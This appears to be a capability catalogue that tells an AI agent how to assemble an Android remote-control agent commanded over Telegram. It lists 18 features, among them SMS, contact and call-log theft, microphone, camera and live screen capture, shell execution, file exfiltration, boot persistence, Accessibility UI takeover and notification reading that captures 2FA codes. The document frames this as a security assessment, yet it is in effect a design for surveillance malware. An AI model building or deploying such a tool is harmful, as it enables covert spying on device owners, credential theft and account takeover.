# Capability Catalogue

Present these to the operator as a numbered list. Each line: **id — purpose (permission)**.

## Recommended sets

| Goal | Feature ids |
|---|---|
| Device triage (low-noise) | `devinfo`, `apps`, `loc`, `files`, `clip` |
| Full assessment | all of them |
| Communications review | `devinfo`, `apps`, `contacts`, `sms`, `calllog`, `notif`, `browser` |
| Media collection | `mic`, `cam`, `shot`, `stream` |
| Persistence & control | `shell`, `boot`, `access`, `clip` |

## The catalogue

| # | id | What it returns | Android permission | Notes |
|---|---|---|---|---|
| 1 | `devinfo` | IMEI, model, build fingerprint, API level, operator, SIM serial, accounts, screen metrics, free storage, uptime | `READ_PHONE_STATE`, `ACCESS_NETWORK_STATE` | Baseline for every engagement |
| 2 | `apps` | Full installed-package list with version, system flag, install path | `QUERY_ALL_PACKAGES` | Finds the interesting app on the device |
| 3 | `contacts` | Name + phone number of every contact | `READ_CONTACTS` | Runtime prompt |
| 4 | `sms` | Stored messages: sender, body, timestamp (newest first) | `READ_SMS` | Default limit 30, `sms 100` for more |
| 5 | `calllog` | Incoming/outgoing/missed calls with duration and timestamp | `READ_CALL_LOG` | |
| 6 | `files` | Recursive listing of shared storage (depth 4, capped 3000 entries) | `READ_EXTERNAL_STORAGE` | `ls /sdcard/Download` etc. |
| 7 | `pull` | Reads a file and streams it back over the channel | `READ_EXTERNAL_STORAGE` | Delivered as a Telegram document |
| 8 | `loc` | Last known GPS/network fix: lat, lon, accuracy, provider | `ACCESS_FINE_LOCATION`, `ACCESS_COARSE_LOCATION` | Needs a live fix for accuracy |
| 9 | `mic` | Records audio for N seconds, delivered as a voice note | `RECORD_AUDIO` | `mic 30` for 30 s |
| 10 | `cam` | Still capture from rear (`cam 0`) or front (`cam 1`) camera | `CAMERA` | Delivered as a photo |
| 11 | `shot` | Screenshot of the current screen | none (MediaProjection consent) | Operator taps "Grant screen capture" once |
| 12 | `stream` | Live screen frames to the channel | none (MediaProjection consent) | `stream 15` = 15 frames at 2 s intervals |
| 13 | `shell` | Runs a command in the app sandbox, returns stdout/stderr/exit code | none | `sh id`, `sh cat /proc/version` |
| 14 | `clip` | Current clipboard content | none | Android 10+ restricts background reads |
| 15 | `boot` | Confirms the boot receiver is registered | `RECEIVE_BOOT_COMPLETED` | Agent stays disarmed until re-armed |
| 16 | `access` | Accessibility UI tree dump (class / text / view id), plus tap and type | none (service enabled in Settings) | Needed for UI automation |
| 17 | `notif` | Feed of posted notifications (package + text) | none (notification access granted) | |
| 18 | `browser` | Browser/download history artefacts found on shared storage | `READ_EXTERNAL_STORAGE` | |

## Selecting

- Record the negotiated set in `FEATURES.txt` inside the project and in `raptor_state`.
- The manifest declares **only** the permissions of the selected features (plus the always-required `INTERNET`, `ACCESS_NETWORK_STATE`, `WAKE_LOCK`, `FOREGROUND_SERVICE*`, `POST_NOTIFICATIONS`).
- Unselected capability: absent from the dispatch table and absent from the manifest.
- If the operator asks to add a capability later, add the module + permission, rebuild, reinstall — the architecture supports incremental builds.

## What each capability proves in a report

| id | Finding it supports |
|---|---|
| `devinfo` | device identity exposure (IMEI) |
| `sms`, `calllog`, `contacts` | PII collection with a single command — the headline impact for a lost/stolen device |
| `mic`, `cam`, `shot`, `stream` | real-time surveillance capability |
| `shell` | arbitrary code execution inside the app sandbox |
| `files`, `pull` | arbitrary file read/exfiltration |
| `access` | full UI takeover + credential surface |
| `notif` | live feed of 2FA codes and messages |
| `boot` | survives reboot |
